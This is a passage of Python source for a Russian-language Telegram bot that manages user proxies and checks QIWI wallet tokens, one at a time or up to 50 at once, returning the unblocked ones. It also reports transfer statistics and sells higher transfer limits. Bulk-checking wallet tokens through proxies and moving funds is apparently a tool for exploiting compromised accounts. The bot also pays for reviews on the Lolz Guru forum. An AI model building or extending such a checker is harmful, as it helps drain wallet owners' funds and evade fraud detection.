                        f"Город: `{proxy_info.get('city')}`\n" + \
                        f"Timezone: `{proxy_info.get('timezone')}`\n" + \
                        f"IP: `{proxy_info.get('query')}`"
                    qiwi.status(tid, "managing_proxy")
                else:
                    kb_proxy.row('⬆️ Загрузить прокси')
                    proxy_text = "⚠️ Прокси отсутствуют!"
                kb_proxy.row('🔙 Отмена')
                bot.send_message(tid, proxy_text, parse_mode="markdown", reply_markup=kb_proxy)
                return
            elif message.text == "⬆️ Загрузить прокси" or message.text == "🔄 Заменить":
                proxy_text = "Отправьте свои *IPv4* прокси для загрузки.\n_Формат: ip:port@login:password или ip:port_"
                bot.send_message(tid, proxy_text, parse_mode='markdown', reply_markup=kb_cancel)
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "adding_proxy")
                return
            elif message.text == "📶 Проверить":
                try:
                    # Получаем прокси пользователя.
                    user_proxy = qiwi.users_proxy[tid]["data"]
                    # Получаем текущий IP.
                    now_ip = get_ip()
                    # Получаем IP по прокси.
                    proxy_ip = get_ip(user_proxy=user_proxy)
                    # Проверяем удалось ли получить IP.
                    if now_ip and proxy_ip and now_ip != proxy_ip:
                        # Получаем информацию об IP.
                        ip_info = get_ip_info(proxy_ip)
                        if ip_info:
                            ip_info_text = f"✅ *Прокси работают!*\n" + \
                                f"Регион: `{ip_info.get('regionName')}`\n" + \
                                f"Страна: `{ip_info.get('country')}`\n" + \
                                f"Город: `{ip_info.get('city')}`\n" + \
                                f"Timezone: `{ip_info.get('timezone')}`\n" + \
                                f"IP: `{ip_info.get('query')}`"

                            qiwi.users_proxy[tid]["checked"] = int(time.time())
                            qiwi.users_proxy[tid]["info"] = {
                                    "regionName": ip_info.get('regionName'),
                                    "country": ip_info.get('country'),
                                    "city": ip_info.get('city'),
                                    "timezone": ip_info.get('timezone'),
                                    "query": ip_info.get('query')
                            }
                            qiwi.save_proxy()
                            bot.send_message(tid, ip_info_text, parse_mode='markdown', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, "🚫 Ошибка - не удалось получить информацию об IP!", reply_markup=kb_del_proxy)
                    else:
                        bot.send_message(tid, "🚫 Ошибка - некорректный IP!", reply_markup=kb_del_proxy)
                except:
                    bot.send_message(tid, '🚫 Ошибка - не удалось загрузить прокси!', reply_markup=kb_main)
                return
            elif message.text == "🗑 Удалить" or message.text == "🗑 Удалить прокси":
                try:
                    qiwi.users_proxy[tid] = {}
                    qiwi.save_proxy()
                except:
                    bot.send_message(tid, '🚫 Ошибка - не удалось удалить прокси!', reply_markup=kb_main)
                else:
                    bot.send_message(tid, '✅ Прокси успешно удалены!', parse_mode='markdown', reply_markup=kb_main)
                return
            elif message.text == "🔑 Ввести токен QIWI кошелька":
                try:
                    numbers = int(qiwi.users_info[tid]["auto"])
                    if not (7 >= numbers >= 1):
                        raise ValueError
                except:
                    numbers = 3
                kb_tokens = ReplyKeyboardMarkup(True)
                for last_token in qiwi.last_tokens.get(tid, [])[::-1][:numbers]:
                    kb_tokens.row(last_token)
                kb_tokens.row('🔙 Отмена')
                proxy_details = '🛡 *Внимание, вы используете прокси!*\n' if qiwi.users_proxy.get(tid, {}).get("work") else ''
                bot.send_message(tid, f"{proxy_details}Введите токен QIWI кошелька или выберите из последних:", parse_mode='markdown', reply_markup=kb_tokens)
                # Меняем статус пользователя.
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "waiting_token")
            elif message.text == '💻 Другие функции':
                bot.send_message(tid, 'Выберите действие:', reply_markup=kb_special)
                return
            elif message.text == '📦 Массовая проверка токенов':
                proxy_details = '🛡 *Внимание, вы используете прокси!*\n' if qiwi.users_proxy.get(tid, {}).get("work") else ''
                proxy_extra = '\n\n⚠️ _Использование прокси может заметно снизить скорость проверки токенов. Во время проверки другие функции бота будут недоступными!_' if proxy_details else ''
                many_text = f'{proxy_details}Отправьте до 50-ти токенов списком. Каждый токен должен быть с новой строки или отделен ";".' + \
                    f'\nПосле проверки всех токенов бот вернет список токенов без блокировок, а также JSON файл с подробным отчетом.{proxy_extra}'
                bot.send_message(tid, many_text, parse_mode='markdown', reply_markup=kb_cancel)
                qiwi.status(tid, "waiting_many_tokens")
                return
            elif message.text == '🔎 Проверить токен на блокировки':
                try:
                    numbers = int(qiwi.users_info[tid]["auto"])
                    if not (7 >= numbers >= 1):
                        raise ValueError
                except:
                    numbers = 3
                kb_tokens = ReplyKeyboardMarkup(True)
                for last_token in qiwi.last_tokens.get(tid, [])[::-1][:numbers]:
                    kb_tokens.row(last_token)
                kb_tokens.row('🔙 Отмена')
                proxy_details = '🛡 *Внимание, вы используете прокси!*\n' if qiwi.users_proxy.get(tid, {}).get("work") else ''
                bot.send_message(tid, f"{proxy_details}Введите токен QIWI кошелька или выберите из последних:", parse_mode='markdown', reply_markup=kb_tokens)
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "waiting_token2")
            elif message.text == "👾 Разработчик":
                # Получаем актуальные контакты для связи с админом.
                if qiwi.load_config() and qiwi.tg_admins:
                    admin_text = 'Аккаунты админа:\n@' + '\n@'.join(qiwi.tg_admins)
                    try:
                        bot.send_photo(tid, requests.get(config.MONKEY_URL).content, caption=admin_text, reply_markup=kb_main)
                    except:
                        bot.send_message(tid, admin_text, reply_markup=kb_main)
                else:
                    bot.send_message(tid, '🚫 Ошибка - не удалось получить контакты админа!', reply_markup=kb_main)
            elif message.text == "📧 Feedback":
                idea_text = "Расскажи, что бы ты хотел увидеть в данном боте.\nПредложения отправляются *анонимно*. Также можешь написать лично админу (в главном меню есть кнопка)."
                bot.send_message(tid, idea_text, parse_mode='markdown', reply_markup=kb_cancel)
                if not qiwi.users_info.get(tid):
                    qiwi.reset(tid)
                qiwi.status(tid, "idea")
            elif message.text == "🔧 Настройки":
                bot.send_message(tid, "Переходим в настройки!", reply_markup=kb_options)
            elif message.text == "💰 Пополнить баланс":
                deposit_text = f"Введите сумму для депозита (10 - 50000):\nТекущий курс: *1к{int(1 / config.SELLER_PERCENT)}*.\n\n" + \
                    'Бонусная программа:\nот 100р - бонус *10%*\nот 500р - бонус *15%*\nот 1000р - бонус *20%*\nот 5000р - бонус *30%*'
                bot.send_message(tid, deposit_text, parse_mode='markdown', reply_markup=kb_deposit)
                qiwi.status(tid, "deposit")
            elif message.text == "🏦 Мой баланс":
                try:
                    # Бесплатные.
                    free = config.FREE_RUBLES
                except:
                    free = 500
                try:
                    # Куплено.
                    have = int(qiwi.users_balance[tid]["have"])
                    # Потрачено.
                    spent = int(qiwi.users_balance[tid]["spent"])
                    # Осталось.
                    left = int(have + free - spent)
                except:
                    have = 0
                    spent = 0
                    left = int(have + free - spent)

                thanks_text = f'*Ваш ID:* `{tid}`\nБаланс: `{bue_numb(have)}`₽\nБесплатно: +`{bue_numb(free)}`₽\n\nПотрачено: `{bue_numb(spent)}`₽\n*Осталось:* `{bue_numb(left)}`₽\n\n' + \
                    f'Поднимите свои лимиты на переводы по курсу *1к{int(1 / config.SELLER_PERCENT)}*.\n_Пополнение на 10₽ -> повышение лимитов на {round(10 / config.SELLER_PERCENT , 2)}₽_'
                bot.send_message(tid, thanks_text, parse_mode='markdown', reply_markup=kb_balance)
                bot.send_message(tid, "Выдам `10'000`₽ за отзыв под темой на Lolz Guru с аккаунта, на котором больше 20 симп.\nПодробнее: *@depols*", parse_mode='markdown')
                try:
                    # Отправляем уведомление админу.
                    if tid != qiwi.notification:
                        qiwi.notif_common_admin(notif_text='🏦 *Баланс просмотрен!*', telegram_id=tid, username=message.from_user.username, last_text=f'\nБаланс: `{bue_numb(have)}`₽\nБесплатно: +`{bue_numb(free)}`₽\nПотрачено: `{bue_numb(spent)}`₽\n*Осталось:* `{bue_numb(left)}`₽')
                except:
                    pass
            elif message.text == "🧭 Мануал по боту": # TODO:
                bot.send_message(tid, 'Раздел в разработке!')
            elif message.text == "📘 Информация":
                bot.send_message(tid, 'Выберите раздел:', reply_markup=kb_info)
            elif message.text == "🤖 О боте":
                bot.send_message(tid, ABOUT_BOT, parse_mode='markdown', reply_markup=kb_main, disable_web_page_preview=True)
            elif message.text == "📊 Статистика":
                # Выводим немного информации о боте.
                try:
                    activity_info = qiwi.activity["info"]
                    static_text = '*Статистика за все время.*\n\n' + \
                        f'Всего пользователей: *{bue_numb(qiwi.user_count.get("count", "None"))}*\n' + \
                        f'Пользователей с проверками: *{bue_numb(qiwi.user_count.get("new_act_tokens", "None"))}*\n' + \
                        f'Пользователей с переводами: *{bue_numb(qiwi.user_count.get("new_act_trans", "None"))}*\n' + \
                        f"Уникальных токенов: *{bue_numb(activity_info['tokens']['count'])}*\n\n" + \
                        f'Проверок: *{bue_numb(activity_info["checks"]["count"])}* на *{bue_numb(activity_info["checks"]["sum"])}*₽\n' + \
                        f'Переводов: *{bue_numb(activity_info["transactions"]["count"])}* на *{bue_numb(activity_info["transactions"]["sum"])}*₽\n\n' + \
                        f'_Заказать своего бота (или рекламу в этом): {config.ADMIN_TG}_'
                    bot.send_message(tid, static_text, parse_mode='markdown', reply_markup=kb_main, disable_web_page_preview=True)
                except:
                    bot.send_message(tid, '🚫 Ошибка - не удалось загрузить информацию!', reply_markup=kb_main)
                else:
                    try:
                        if tid != qiwi.notification:
                            qiwi.notif_stat_admin(telegram_id=tid, username=message.from_user.username)
                    except:
                        pass
            else:
                bot.send_message(tid, 'Я не понимаю, чего ты хочешь, бака!', reply_markup=kb_main)

if __name__ == "__main__":
    print('[~] Загружаем настройки...')
    if qiwi.load_config():
        # Загружаем пользовательские настройки.
        qiwi.load_users_info()
        # Загружаем балансы пользователей.
        qiwi.load_balances()
        # Загружаем прокси пользователей.
        qiwi.load_proxy()
        print('[v] Подключение установлено!')
        print()
        try:
            print('[~] Запускаю бота... Можешь писать боту в Telegram!')
            bot.polling(none_stop=True, interval=0)
        except:
            print('[x] Бот крашнулся :c')
        print()
    else:
        print(f'[x] Не удалось загрузить конфиг.')
